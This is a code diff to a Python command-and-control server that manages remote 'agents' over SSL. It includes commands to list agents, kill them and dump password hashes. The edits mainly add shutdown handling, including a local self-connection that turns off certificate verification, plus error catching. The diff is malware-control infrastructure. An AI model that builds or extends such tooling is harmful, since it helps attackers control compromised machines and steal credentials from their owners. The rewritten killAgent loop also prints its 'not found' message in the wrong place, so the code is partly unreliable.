@@ -1,5 +1,7 @@
 import socket, threading, ssl
 import secrets, os, platform, json
+import sys
+
 from agent import Agent
 from symbols import *
 import select, datetime
@@ -17,6 +19,7 @@ class Server:
         self.platform = platform.system() # Initialize the C2 platform
         self.stop_event = threading.Event() # Test to stop threads
         self.current_agent = Agent(['',''],'',0) # Dummy agent for initialisation
+        self.is_exited = False
         self.banner = """
         ███████╗████████╗██████╗ ██╗   ██╗███████╗███████╗     ██████╗██████╗ 
         ██╔════╝╚══██╔══╝██╔══██╗╚██╗ ██╔╝██╔════╝██╔════╝    ██╔════╝╚════██╗
@@ -119,6 +122,8 @@ class Server:
         """
 
         json_string = client_socket.recv(4096).decode()
+        if not json_string:
+            return
         json_object = json.loads(json_string)
 
         agent = self.newAgent(client_socket.getpeername(), client_socket, json_object['uid'])
@@ -134,12 +139,16 @@ class Server:
     def acceptConnections(self):
         """Loop accepting incoming connections"""
         while not self.stop_event.is_set():
+            if self.is_exited:
+                return
             client_socket, client_address = self.sock.accept()
             try:
                 client_socket = self.context.wrap_socket(client_socket, server_side=True)
                 self.handleClient(client_socket)
             except ssl.SSLError as e:
                 print(f"SSL error: {e}")
+            except OSError:
+                pass
 
     def start(self):
         """Start the server, socket initialization, binding, listening and creation of SSL context for encryption"""
@@ -161,9 +170,7 @@ class Server:
             try:
                 command = session.prompt(f"{active_agent}> ").strip()
             except KeyboardInterrupt:
-                #TODO proper quit
-                print('\nQuitting...')
-                exit()
+                self.exit()
 
             if command:
                 command_name, *args = command.split(' ')
@@ -176,11 +183,25 @@ class Server:
                 else:
                     print(f"Unknown command: {command_name}")
 
+    def simple_ssl_connection(self):
+        # open connection socket to the listening socket. SSL connection
+        context = ssl.create_default_context()
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
 
-    def exit(self, args):
-        self.closeAllConn()
-        self.stop_event.set()
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        secure_sock = context.wrap_socket(sock, server_hostname=self.address)
+
+        secure_sock.connect((self.address, self.port))
+
+    def exit(self, args=None):
+        print("\nClosing server...")
+        # unblock the listener
+        self.simple_ssl_connection()
         self.server_socket.close()
+        self.stop_event.set()
+        self.closeAllConn()
+        self.is_exited = True
         exit(0)
 
     def displayAgents(self, args):
@@ -305,15 +326,22 @@ class Server:
     def killAgent(self, id):
         try:
             id = int(id)
+            found_flag = False
+            for index, agent in enumerate(self.agents):
+                if agent.id == id:
+                    found_flag = True
+                    agent.sock.sendall("kill".encode())
+                    agent.sock.close()
+                    self.agents.pop(index)
+                    break
+                if not found_flag:
+                    print(f"No agent with ID {id}")
+            if self.current_agent.id == id:
+                self.current_agent = Agent(['',''],'',0) # Reset with a dummy agent
         except ValueError:
-            print("Agent ID needs to be an Integer")            
-        for index, agent in enumerate(self.agents):
-            if agent.id == id:
-                agent.sock.close()
-                self.agents.pop(index)
-                break
-        if self.current_agent.id == id:
-            self.current_agent = Agent(['',''],'',0) # Reset with a dummy agent
+            print("Agent ID needs to be an Integer")
+        except OSError:
+            pass
 
     def hashdump(self, args):
         files = []
@@ -401,6 +429,8 @@ class Server:
     def checkAgents(self):
         """Kill the agents if we can't contact them"""
         while True:
+            if self.is_exited:
+                return
             for agent in self.agents:
                 if not self.isSocketAlive(agent.sock):
                     print(f"\nAgent {agent.id} died ({agent.ip})")
